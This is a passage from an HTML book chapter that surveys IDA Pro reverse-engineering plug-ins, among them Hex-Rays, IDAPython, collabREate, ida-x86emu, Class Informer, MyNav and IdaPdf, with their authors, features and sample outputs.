}</pre><p>Keep in mind that information is lost during compilation. There is no need to retain symbol information for any nonexternal symbols, and compiler optimizations tend to remove redundancies and streamline code. As a result, in addition to the liberal use of type casts, you are also likely to notice more <code class="literal">goto</code> statements in the generated pseudocode than you might generally expect to see in human-generated C code. This is not unexpected, because it is often very difficult to neatly map compiler-generated control flows back to their original C form. However, Hex-Rays is capable of recognizing complex C constructs such as <code class="literal">switch</code> statements, and a tremendous amount of work has been put into recognizing standard code sequences utilized by various C compilers.</p><p>For all of its capabilities, you are encouraged not to become overreliant on Hex-Rays. C source is certainly easier to read and more succinct than its corresponding assembly representation, but decompilation is not a perfect science. In reading Hex-Rays pseudocode, you are trusting that what you see is a faithful representation of the underlying assembly, and while Ilfak works very hard to ensure that Hex-Rays is as accurate as possible, there are certainly edge cases that may prove problematic for Hex-Rays. It is highly recommended that you back up any conclusions you draw from reading Hex-Rays pseudo-code by verifying them against the underlying assembly code. Finally, keep in mind that while Hex-Rays may be used on binaries compiled from C++ code, it is only capable of generating C code, and the resulting code will lack any features that are specific to C++.</p></div><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a class="para" href="#CHP-23-FN-1" id="ftn.CHP-23-FN-1">200</a>] </sup>See <a class="ulink" href="http://www.hex-rays.com/idapro/idadown.htm">http://www.hex-rays.com/idapro/idadown.htm</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-23-FN-2" id="ftn.CHP-23-FN-2">201</a>] </sup>See <a class="ulink" href="http://www.openrce.org/downloads/">http://www.openrce.org/downloads/</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-23-FN-3" id="ftn.CHP-23-FN-3">202</a>] </sup>See <a class="ulink" href="http://www.woodmann.com/forum/index.php">http://www.woodmann.com/forum/index.php</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-23-FN-4" id="ftn.CHP-23-FN-4">203</a>] </sup>See <a class="ulink" href="http://www.hex-rays.com/decompiler.shtml">http://www.hex-rays.com/decompiler.shtml</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-23-FN-5" id="ftn.CHP-23-FN-5">204</a>] </sup>See <a class="ulink" href="http://www.hex-rays.com/manual/">http://www.hex-rays.com/manual/</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-23-FN-6" id="ftn.CHP-23-FN-6">205</a>] </sup>See <a class="ulink" href="http://www.hexblog.com/?p=107">http://www.hexblog.com/?p=107</a>. Not to be confused with IDA SDK.</p></div></div></div>
<div class="sect1" title="IDAPython"><div class="titlepage"><div><div><h1 class="title"><a id="idapython-id1"/>IDAPython</h1></div></div></div><p>IDAPython began life as a third-party IDA plug-in developed by Gergely Erdelyi and is covered more thoroughly in <a class="xref" href="ch15.html" title="Chapter 15. IDA Scripting">Chapter 15</a>. Its popularity among IDA users spread rapidly, and since IDA 5.4, IDAPython has shipped as a standard plug-in with all versions of IDA. Nonetheless, IDAPython remains available as an open source project that you may download and modify to suit your needs.<a class="indexterm" id="IDX-CHP-23-0025"/><a class="indexterm" id="IDX-CHP-23-0026"/><a class="indexterm" id="IDX-CHP-23-0027"/><a class="indexterm" id="IDX-CHP-23-0028"/><a class="indexterm" id="IDX-CHP-23-0029"/><a class="indexterm" id="IDX-CHP-23-0030"/><a class="indexterm" id="IDX-CHP-23-0031"/></p><p>Instructions for building IDAPython are available in the file <span class="emphasis"><em>BUILDING.txt</em></span> contained in the IDAPython source, while instructions for installation are available on the IDAPython website. If you elect to build IDAPython from source, a number of dependencies must be satisfied. First and foremost is the need to have a working installation of 32-bit Python. Windows and OS X users are recommended to obtain and install Python using one of the installers available at the Python website.<sup>[<a class="footnote" href="#ftn.CHP-23-FN-7" id="CHP-23-FN-7">206</a>]</sup> Linux users can generally get by with the 32-bit version of Python available for their flavor of Linux. Note that as of this writing, IDAPython is not compatible with Python version 3.<span class="emphasis"><em>x</em></span>.</p><div class="informaltable"><table style="border-collapse: collapse;border-top: 0.5pt solid ; border-bottom: 0.5pt solid ; border-left: 0.5pt solid ; border-right: 0.5pt solid ; "><colgroup><col/><col/></colgroup><tbody><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Name</strong></span></p></td><td style="text-align: left" valign="top"><p>IDAPython</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Author</strong></span></p></td><td style="text-align: left" valign="top"><p>Gergely Erdelyi</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Distribution</strong></span></p></td><td style="text-align: left" valign="top"><p>Source and binary (A binary version also ships with IDA.)</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Price</strong></span></p></td><td style="text-align: left" valign="top"><p>Free</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Description</strong></span></p></td><td style="text-align: left" valign="top"><p>Python scripting engine for IDA Pro</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Information</strong></span></p></td><td style="text-align: left" valign="top"><p><a class="ulink" href="http://code.google.com/p/idapython/">http://code.google.com/p/idapython/</a></p></td></tr></tbody></table></div><p>The Python build script supplied with IDAPython, <span class="emphasis"><em>build.py</em></span>, makes use of the Simplified Wrapper Interface Generator (SWIG)<sup>[<a class="footnote" href="#ftn.CHP-23-FN-8" id="CHP-23-FN-8">207</a>]</sup> to generate the components required to interface Python to IDA’s C++ libraries, and the header files that ship with the IDA SDK (since version 5.4) contain a number of macro declarations to ensure that they are compatible with SWIG. In addition to SWIG, the build process requires a C++ compiler. For Windows builds, the build script is configured to use Microsoft Visual C++,<sup>[<a class="footnote" href="#ftn.CHP-23-FN-9" id="CHP-23-FN-9">208</a>]</sup> while for Linux and Mac builds, the build process utilizes g++.</p><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a class="para" href="#CHP-23-FN-7" id="ftn.CHP-23-FN-7">206</a>] </sup>See <a class="ulink" href="http://www.python.org/">http://www.python.org/</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-23-FN-8" id="ftn.CHP-23-FN-8">207</a>] </sup>See <a class="ulink" href="http://www.swig.org/">http://www.swig.org/</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-23-FN-9" id="ftn.CHP-23-FN-9">208</a>] </sup>To obtain a free, stripped-down version of Visual C++, please visit <a class="ulink" href="http://www.microsoft.com/express/">http://www.microsoft.com/express/</a>.</p></div></div></div>
<div class="sect1" title="collabREate"><div class="titlepage"><div><div><h1 class="title"><a id="collabreate"/>collabREate</h1></div></div></div><p>The collabREate plug-in is designed to facilitate collaboration between multiple users analyzing the same binary file. The goals of the project are to provide a natural integration of a plug-in component representing the synchronization client with a robust server component backed by a SQL database and capable of supporting features beyond simple database synchronization.<a class="indexterm" id="IDX-CHP-23-0032"/><a class="indexterm" id="IDX-CHP-23-0033"/></p><div class="informaltable"><table style="border-collapse: collapse;border-top: 0.5pt solid ; border-bottom: 0.5pt solid ; border-left: 0.5pt solid ; border-right: 0.5pt solid ; "><colgroup><col/><col/></colgroup><tbody><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Name</strong></span><a class="indexterm" id="IDX-CHP-23-0034"/><a class="indexterm" id="IDX-CHP-23-0035"/><a class="indexterm" id="IDX-CHP-23-0036"/><a class="indexterm" id="IDX-CHP-23-0037"/><a class="indexterm" id="IDX-CHP-23-0038"/></p></td><td style="text-align: left" valign="top"><p>collabREate</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Author</strong></span></p></td><td style="text-align: left" valign="top"><p>Chris Eagle and Tim Vidas</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Distribution</strong></span></p></td><td style="text-align: left" valign="top"><p>C++ source and binary (including IDA freeware)</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Price</strong></span></p></td><td style="text-align: left" valign="top"><p>Free</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Description</strong></span></p></td><td style="text-align: left" valign="top"><p>Collaborative framework for synchronizing remote IDA sessions</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Information</strong></span></p></td><td style="text-align: left" valign="top"><p><a class="ulink" href="http://www.idabook.com/collabreate/">http://www.idabook.com/collabreate/</a></p></td></tr></tbody></table></div><p>From a high-level perspective, collabREate owes much to the IDA Sync project.<sup>[<a class="footnote" href="#ftn.CHP-23-FN-10" id="CHP-23-FN-10">209</a>]</sup> The collabREate plug-in processes databases updates and communicates with a remote server component to synchronize database updates with additional project members. Because IDA is a single-threaded application, some mechanism for dealing with asynchronous non-blocking network communications is necessary. In IDA versions prior to 6.0, the asynchronous communications component derives from the Windows Asynchronous Sockets techniques used by IDA Sync; however, with the introduction of IDA 6.0, asynchronous communications are now handled using Qt socket classes, allowing collabREate to be used on all IDA-supported platforms.<a class="indexterm" id="IDX-CHP-23-0039"/><a class="indexterm" id="IDX-CHP-23-0040"/></p><p>CollabREate takes an integrated approach to capturing user actions by leveraging IDA’s process and IDB event-notification mechanisms. By hooking various database change notifications, collabREate is able to seamlessly propagate database updates to the collabREate server. The types and numbers of change notifications generated by IDA have grown with each release of IDA, and collabREate endeavors to hook as many useful notifications as it possibly can for the version of IDA that it has been built for. An interesting side effect of using collabREate is that it allows users of very different versions of IDA (5.2 and 6.0, for example) to synchronize their activities even when they would be unable to exchange <span class="emphasis"><em>.idb</em></span> files with one another.<sup>[<a class="footnote" href="#ftn.CHP-23-FN-11" id="CHP-23-FN-11">210</a>]</sup> The collabREate architecture offers true publish and subscribe capabilities to participating users. A user may selectively choose to publish her changes to the collabREate server, subscribe to changes posted to the server, or both publish and subscribe. For example, an experienced user may wish to share (publish) her changes with a group while blocking (not subscribing to) all changes made by other users. Users may select the types of actions to which they may publish and subscribe, such as byte-value changes, name changes, and the addition or deletion of comments. For example, one user may wish only to publish comments, while another user may wish to subscribe only to name changes and patched-byte notifications.<a class="indexterm" id="IDX-CHP-23-0041"/></p><p>One of the most significant features of the collabREate plug-in is its degree of integration with the IDA SDK. IDA notifications are tied to specific database actions, not specific user actions. The fact that user actions happen to trigger IDA notifications is, of course, critical to the collaborative process; however, notifications can be triggered by other means as well. Scripts and API function calls can generate notification messages as well. As a result, the actions of a script that patches database bytes, renames locations or variables, or inserts new comments will be published to the collabREate server and will ultimately be shared with other IDA users working on the same project.<a class="indexterm" id="IDX-CHP-23-0042"/><a class="indexterm" id="IDX-CHP-23-0043"/><a class="indexterm" id="IDX-CHP-23-0044"/><a class="indexterm" id="IDX-CHP-23-0045"/><a class="indexterm" id="IDX-CHP-23-0046"/><a class="indexterm" id="IDX-CHP-23-0047"/></p><p>The collabREate server component is currently implemented in Java and utilizes JDBC<sup>[<a class="footnote" href="#ftn.CHP-23-FN-12" id="CHP-23-FN-12">211</a>]</sup> to communicate with a backend SQL database. The server is responsible for user and project management. User accounts are managed via a command-line interface to the server, while projects are created by users as they connect to the server. Following authentication with the server, a user’s collabREate plug-in sends the MD5 hash of the input file that the user is analyzing to the server. The MD5 value is used to ensure that multiple users are in fact working on identical input files. Upon initial connection, users indicate the types of updates that they would like to subscribe to, at which point the server forwards all updates that have been cached since the user’s last session. CollabREate’s Project Selection dialog is shown in <a class="xref" href="ch23s03.html#collabreate_project_selection_dialog" title="Figure 23-2. CollabREate Project Selection dialog">Figure 23-2</a>.</p><div class="figure"><a id="collabreate_project_selection_dialog"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject4_d1e40666"/><img alt="CollabREate Project Selection dialog" src="httpatomoreillycomsourcenostarchimages854347.png.jpg"/></div></div><p class="title">Figure 23-2. CollabREate Project Selection dialog</p></div><p>Users are presented with a drop-down list of projects that are compatible with the current database. As an option, it is always possible to create a new project that requires the user to enter a project description for others to view.</p><p>The collabREate server is capable of forking existing projects to allow users to create alternate branches of a project without impacting other users. This is a useful feature if you want to make (and track) a significant number of changes to a database without forcing those changes on other users. Since the server is capable of handling multiple projects related to a single binary input file, the plug-in and the server take additional steps to ensure that users are connecting to the proper project for their particular database.</p><p>The server does not provide rollback capability but does provide for a form of “save point.” A snapshot can be made at any time; then, to return to that database state, a user could re-open the binary (new <span class="emphasis"><em>.idb</em></span> file) and fork a new project from the snapshot. This allows users to return to a specific point in time in the reversing process. CollabREate’s fork and snapshot features are accessed through the same hotkey sequence used for initial activation of the plug-in, which results in the dialog shown in <a class="xref" href="ch23s03.html#collabreate_select_command_dialog" title="Figure 23-3. CollabREate Select Command dialog">Figure 23-3</a>.</p><div class="figure"><a id="collabreate_select_command_dialog"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject4_d1e40686"/><img alt="CollabREate Select Command dialog" src="httpatomoreillycomsourcenostarchimages854350.png"/></div></div><p class="title">Figure 23-3. CollabREate Select Command dialog</p></div><p>A final feature of the collabREate server is the ability to restrict users to specific types of updates. For example, one user may be restricted to a subscribe-only profile, while another user may be allowed to publish only comments, while a third is allowed to publish all types of updates.<a class="indexterm" id="IDX-CHP-23-0048"/><a class="indexterm" id="IDX-CHP-23-0049"/><a class="indexterm" id="IDX-CHP-23-0050"/></p><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a class="para" href="#CHP-23-FN-10" id="ftn.CHP-23-FN-10">209</a>] </sup>See <a class="ulink" href="http://pedram.redhive.com/code/ida_plugins/ida_sync/">http://pedram.redhive.com/code/ida_plugins/ida_sync/</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-23-FN-11" id="ftn.CHP-23-FN-11">210</a>] </sup>Older versions of IDA are typically unable to open <span class="emphasis"><em>.idb</em></span> files created with newer versions of IDA.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-23-FN-12" id="ftn.CHP-23-FN-12">211</a>] </sup><span class="emphasis"><em>JDBC</em></span> is the Java Database Connectivity API.</p></div></div></div>
<div class="sect1" title="ida-x86emu"><div class="titlepage"><div><div><h1 class="title"><a id="ida-x86emu"/>ida-x86emu</h1></div></div></div><p>Reverse engineering binaries often involves hand tracing through code in order to develop an understanding of how a function behaves. In order to do this, you need a solid understanding of the instruction set you are analyzing and a handy reference to refresh your memory when you encounter an instruction that doesn’t look familiar. An instruction emulator can be a useful tool to track all of the register and CPU state changes that take place over a series of instructions. The ida-x86emu plug-in, which was discussed in detail in <a class="xref" href="ch21.html" title="Chapter 21. Obfuscated Code Analysis">Chapter 21</a> and whose information is shown again here, is one such emulator.<a class="indexterm" id="IDX-CHP-23-0051"/><a class="indexterm" id="IDX-CHP-23-0052"/></p><div class="informaltable"><table style="border-collapse: collapse;border-top: 0.5pt solid ; border-bottom: 0.5pt solid ; border-left: 0.5pt solid ; border-right: 0.5pt solid ; "><colgroup><col/><col/></colgroup><tbody><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Name</strong></span></p></td><td style="text-align: left" valign="top"><p>ida-x86emu</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Author</strong></span></p></td><td style="text-align: left" valign="top"><p>Chris Eagle</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Distribution</strong></span></p></td><td style="text-align: left" valign="top"><p>Source for SDK v6.1 and binaries for all versions of IDA from 5.0, including IDA Freeware. Source is backward compatible to SDK version 4.9.</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Price</strong></span></p></td><td style="text-align: left" valign="top"><p>Free</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Description</strong></span></p></td><td style="text-align: left" valign="top"><p>Embedded x86 instruction emulator for IDA</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Information</strong></span></p></td><td style="text-align: left" valign="top"><p><a class="ulink" href="http://www.idabook.com/ida-x86emu/">http://www.idabook.com/ida-x86emu/</a></p></td></tr></tbody></table></div><p>This plug-in is distributed in source and binary form and is compatible with IDA SDK versions 4.6 and later. The plug-in is distributed with build scripts and project files to facilitate building with MinGW tools or Microsoft Visual Studio on Windows platforms and g++ on non-Windows platforms. A precompiled binary version of the plug-in for use with IDA freeware is included in the distribution. ida-x86emu is compatible with all Qt-based versions of IDA; however, prior to IDA 6.0, the plug-in is compatible with only the Windows GUI version of IDA.</p><p>The plug-in was developed with self-modifying code in mind and operates by reading instruction bytes from the current IDA database, decoding the instruction, and performing the associated operation. Operations may involve updating the emulator’s internal register variables or writing back to the database in the case of self-modifying code. A simulated stack and a heap are implemented by allocating new IDA segments that are read and written as appropriate. For more detailed information on using ida-x86emu, please refer to <a class="xref" href="ch21.html" title="Chapter 21. Obfuscated Code Analysis">Chapter 21</a>.</p></div>
<div class="sect1" title="Class Informer"><div class="titlepage"><div><div><h1 class="title"><a id="class_informer"/>Class Informer</h1></div></div></div><p>Recall from <a class="xref" href="ch08.html" title="Chapter 8. Datatypes and Data Structures">Chapter 8</a> that C++ programs may include information that can assist you in recovering class names and class hierarchies. This embedded information is designed to support C++ Runtime Type Identification (RTTI). The C++ Class Informer plug-in by Sirmabus is designed to assist in the process of reverse engineering C++ code that was compiled using Microsoft Visual Studio. Class Informer automates much of the process described by Igor Skochinsky in his OpenRCE article on reversing Microsoft Visual C++<sup>[<a class="footnote" href="#ftn.CHP-23-FN-13" id="CHP-23-FN-13">212</a>]</sup> by identifying virtual function tables (vtables or vftables) and RTTI information and then extracting related class name and inheritance information.<a class="indexterm" id="IDX-CHP-23-0053"/></p><div class="informaltable"><table style="border-collapse: collapse;border-top: 0.5pt solid ; border-bottom: 0.5pt solid ; border-left: 0.5pt solid ; border-right: 0.5pt solid ; "><colgroup><col/><col/></colgroup><tbody><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Name</strong></span></p></td><td style="text-align: left" valign="top"><p>Class Informer</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Author</strong></span></p></td><td style="text-align: left" valign="top"><p>Sirmabus</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Distribution</strong></span></p></td><td style="text-align: left" valign="top"><p>Binary only</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Price</strong></span></p></td><td style="text-align: left" valign="top"><p>Free</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Description</strong></span></p></td><td style="text-align: left" valign="top"><p>MSVC C++ class identifier</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Download</strong></span></p></td><td style="text-align: left" valign="top"><p><a class="ulink" href="http://www.macromonkey.com/downloads/IDAPlugIns/Class_Informer102.zip">http://www.macromonkey.com/downloads/IDAPlugIns/Class_Informer102.zip</a></p></td></tr></tbody></table></div><p>Upon activation, Class Informer displays the options dialog shown in <a class="xref" href="ch23s05.html#class_informer_options_dialog" title="Figure 23-4. Class Informer options dialog">Figure 23-4</a>, allowing the user to dictate where within the binary Class Informer should scan for vtables and permitting the user to control the verbosity of Class Informer’s output.</p><div class="figure"><a id="class_informer_options_dialog"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject4_d1e40854"/><img alt="Class Informer options dialog" src="httpatomoreillycomsourcenostarchimages854353.png.jpg"/></div></div><p class="title">Figure 23-4. Class Informer options dialog</p></div><p>Once the user clicks Continue, Class Informer begins its scan, which may take some time depending on the size of the binary and the number of virtual function tables that Class Informer encounters. When complete, Class Informer opens a new tabbed window within IDA in order to summarize its findings. A partial listing, representative of Class Informer’s output, is shown here.</p><a id="I_programlisting4_d1e40861"/><pre class="programlisting"><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>  Vftable    <img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/>Method count    <img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/>Class &amp; structure info
 0041A298     0003              ChildClass;  [MI]
 0041A2A8     0003              ChildClass: SuperClass1, SuperClass2;  [MI]
 0041A2B8     0003              SuperClass1;  [SI]
 0041A2C8     0003              SuperClass2;  [SI]
 0041A2D8     0004              BaseClass;  [SI]
 0041A2EC     0005              SubClass: BaseClass;  [SI]</pre><p>For each virtual function table discovered, Class Informer displays the address of the vtable <span class="inlinemediaobject"><a id="I_inlinemediaobject4_d1e40882"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span>, the method count <span class="inlinemediaobject"><a id="I_inlinemediaobject4_d1e40888"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span> (equal to the number of function pointers contained in the vtable), and summary information about each class <span class="inlinemediaobject"><a id="I_inlinemediaobject4_d1e40894"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span> derived from embedded RTTI information. Recovered class information includes the name of the class, the name of any superclasses, and an indication of whether the class inherits from a single base class (<code class="literal">[SI]</code>) or multiple base classes (<code class="literal">[MI]</code>). For each vtable discovered, Class Informer also applies structure templates to all of the RTTI-related data structures associated with the class as well as naming each structure and the class’s vtable in accordance with Microsoft’s name-mangling scheme. This results in a substantial time saving for anyone who may be reverse engineering Visual C++ code of any complexity.<a class="indexterm" id="IDX-CHP-23-0054"/><a class="indexterm" id="IDX-CHP-23-0055"/><a class="indexterm" id="IDX-CHP-23-0056"/><a class="indexterm" id="IDX-CHP-23-0057"/><a class="indexterm" id="IDX-CHP-23-0058"/><a class="indexterm" id="IDX-CHP-23-0059"/><a class="indexterm" id="IDX-CHP-23-0060"/></p><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a class="para" href="#CHP-23-FN-13" id="ftn.CHP-23-FN-13">212</a>] </sup>See <a class="ulink" href="http://www.openrce.org/articles/full_view/23">http://www.openrce.org/articles/full_view/23</a>.</p></div></div></div>
<div class="sect1" title="MyNav"><div class="titlepage"><div><div><h1 class="title"><a id="mynav"/>MyNav</h1></div></div></div><p>While not, strictly speaking, a plug-in, Joxean Koret’s Python scripts, dubbed <span class="emphasis"><em>MyNav</em></span>, certainly qualify as a useful IDA extension, useful enough that MyNav earned the top spot in the Hex-Rays plug-in writing contest for 2010.<sup>[<a class="footnote" href="#ftn.CHP-23-FN-14" id="CHP-23-FN-14">213</a>]</sup> The <span class="emphasis"><em>mynav.py</em></span> script should be launched after you have loaded a binary and the initial autoanalysis has completed. Upon launch, MyNav adds 20 new menu options to IDA’s Edit ▸ Plugins menu, at which point you are ready to take advantage of a number of new features.</p><div class="informaltable"><table style="border-collapse: collapse;border-top: 0.5pt solid ; border-bottom: 0.5pt solid ; border-left: 0.5pt solid ; border-right: 0.5pt solid ; "><colgroup><col/><col/></colgroup><tbody><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Name</strong></span></p></td><td style="text-align: left" valign="top"><p>MyNav</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Author</strong></span></p></td><td style="text-align: left" valign="top"><p>Joxean Koret</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Distribution</strong></span></p></td><td style="text-align: left" valign="top"><p>Python source</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Price</strong></span></p></td><td style="text-align: left" valign="top"><p>Free</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Description</strong></span></p></td><td style="text-align: left" valign="top"><p>Debugger tracing and code coverage tool</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Information</strong></span></p></td><td style="text-align: left" valign="top"><p><a class="ulink" href="http://code.google.com/p/mynav/">http://code.google.com/p/mynav/</a></p></td></tr></tbody></table></div><p>Among the features added by MyNav are a function-level (as opposed to basic block-level) graphical browser inspired by Zynamics’s BinNavi, additional graphing features such as displaying the code paths between any two functions, and a number of features designed to enhance IDA’s debugging capabilities.</p><p>For debugging, MyNav records information about debugging sessions and allows you to use the results of one debugging session to serve as a filter for subsequent sessions. Following any debugging session, MyNav displays a graph that highlights only those functions executed during the session. Using the capabilities offered by MyNav, it is possible to quickly narrow down sets of functions that are responsible for specific actions within a program. For example, if you happen to be interested in the functions that are responsible for initiating network connections and downloading some content, you might create a session that does everything but initiate a network connection and then conduct a second session in which you do create a network connection. By excluding all functions that executed during your first debugging session, the resulting graph will contain hits for just those functions responsible for initiating the network connection. This feature is very useful if you are trying to characterize functions with very large binaries.<a class="indexterm" id="IDX-CHP-23-0061"/><a class="indexterm" id="IDX-CHP-23-0062"/></p><p>For a full discussion of MyNav’s features, please refer to Joxean’s blog,<sup>[<a class="footnote" href="#ftn.CHP-23-FN-15" id="CHP-23-FN-15">214</a>]</sup> where you will find a number of video walkthroughs demonstrating some of the capabilities of MyNav.</p><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a class="para" href="#CHP-23-FN-14" id="ftn.CHP-23-FN-14">213</a>] </sup>See <a class="ulink" href="http://www.hex-rays.com/contest2010/#mynav">http://www.hex-rays.com/contest2010/#mynav</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-23-FN-15" id="ftn.CHP-23-FN-15">214</a>] </sup>See <a class="ulink" href="http://www.joxeankoret.com/blog/2010/05/02/mynav-a-python-plugin-for-ida-pro/">http://www.joxeankoret.com/blog/2010/05/02/mynav-a-python-plugin-for-ida-pro/</a>.</p></div></div></div>
<div class="sect1" title="IdaPdf"><div class="titlepage"><div><div><h1 class="title"><a id="idapdf"/>IdaPdf</h1></div></div></div><p>Document-based malware is becoming increasingly common. Malicious PDF files are one example of document files designed to exploit vulnerabilities in document-viewing software. Analyzing malicious PDF files (or any document files for that matter) requires that you understand the structure of the file you are analyzing. In dissecting the structure of such a file, your goal is often to discover any embedded code that may get executed if the document is successfully utilized to compromise a computer used to view it. The few PDF analysis tools that exist are primarily targeted at the command-line user with the goal of facilitating the extraction of information that might ultimately be loaded into IDA for further analysis.<a class="indexterm" id="IDX-CHP-23-0063"/><a class="indexterm" id="IDX-CHP-23-0064"/></p><div class="informaltable"><table style="border-collapse: collapse;border-top: 0.5pt solid ; border-bottom: 0.5pt solid ; border-left: 0.5pt solid ; border-right: 0.5pt solid ; "><colgroup><col/><col/></colgroup><tbody><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Name</strong></span></p></td><td style="text-align: left" valign="top"><p>IdaPdf</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Author</strong></span></p></td><td style="text-align: left" valign="top"><p>Chris Eagle</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Distribution</strong></span></p></td><td style="text-align: left" valign="top"><p>C++ source</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Price</strong></span></p></td><td style="text-align: left" valign="top"><p>Free</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Description</strong></span></p></td><td style="text-align: left" valign="top"><p>PDF loader and plug-in for dissecting and navigating PDF files</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Information</strong></span></p></td><td style="text-align: left" valign="top"><p><a class="ulink" href="http://www.idabook.com/idapdf/">http://www.idabook.com/idapdf/</a></p></td></tr></tbody></table></div><p>IdaPdf consists of an IDA loader module and an IDA plug-in module, each designed to facilitate the analysis of PDF files. The loader component of IdaPdf recognizes PDF files and loads them into a new IDA database. The loader takes care of breaking the PDF into its individual components. During the loading process, the loader makes every attempt to extract and filter all PDF stream objects. Since loader modules get unloaded once the load process is complete, a second component, the IdaPdf plug-in, is required in order to provide PDF analysis capabilities beyond the initial loading. The plug-in module, upon recognizing that a PDF file has been loaded, proceeds to enumerate all of the PDF objects contained within the file and opens a new tabbed window containing a list of every object within the PDF. The following listing is representative of the type of information contained in the PDF Objects window.<a class="indexterm" id="IDX-CHP-23-0065"/><a class="indexterm" id="IDX-CHP-23-0066"/><a class="indexterm" id="IDX-CHP-23-0067"/></p><a id="I_programlisting4_d1e41098"/><pre class="programlisting">Num  Location  Type         Data Offs  Data size
    Filters         Filtered stream  Filtered size  Ascii
17   000e20fe  Stream       000e2107      313       /FlateDecode
    000f4080             210        No
35   00000010  Dictionary   00000019       66
                                                       Yes
36   000002a3  Dictionary   000002ac      122
                                                       Yes
37   0000032e  Stream       00000337      470       [/FlateDecode]
  000f4170             1367       Yes</pre><p>The listing shows object numbers along with the location of the object, the object’s data, any filters that must be applied to stream objects, and a pointer to the extracted, unfiltered data. Context-sensitive menu options allow for easy navigating to view either the object data or any extracted filtered data. The opportunity to extract object data, either raw or filtered, is also made available via context-sensitive menu options. The Ascii column indicates the plug-in’s best-effort opinion as to whether the object contains only ASCII data in its raw or filtered versions.</p><p>The last features implemented by IdaPdf are exposed through the addition of two new menu options under Edit ▸ Other when IdaPdf is launched. These menu options allow you to highlight a block of data in the database and then ask the plug-in to Base64 decode the data or unescape<sup>[<a class="footnote" href="#ftn.CHP-23-FN-16" id="CHP-23-FN-16">215</a>]</sup> the data, with the results being copied into a newly created section within IDA. Such uncoded data will often turn out to be the malicious payload contained within the PDF. Since the plug-in extracts this data to a new IDA segment, it is fairly straightforward to navigate to the extracted data and ask IDA to disassemble some or all of it.</p><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a class="para" href="#CHP-23-FN-16" id="ftn.CHP-23-FN-16">215</a>] </sup>The plug-in implements the JavaScript unescape function.</p></div></div></div>
<div class="sect1" title="Summary"><div class="titlepage"><div><div><h1 class="title"><a id="summary-id22"/>Summary</h1></div></div></div><p>Anytime you find yourself wishing that IDA could perform some task, you should take a moment to wonder whether anyone else may have had the same wish and, further, whether someone has done something about implementing the missing functionality. Many IDA plug-ins are the result of exactly this kind of effort. The vast majority of publicly available plug-ins are short and sweet and designed to solve a specific problem. In addition to serving as potential solutions for your reverse engineering problems, plug-ins for which source code is available can serve as valuable references for interesting uses of the IDA SDK.</p></div></body></html>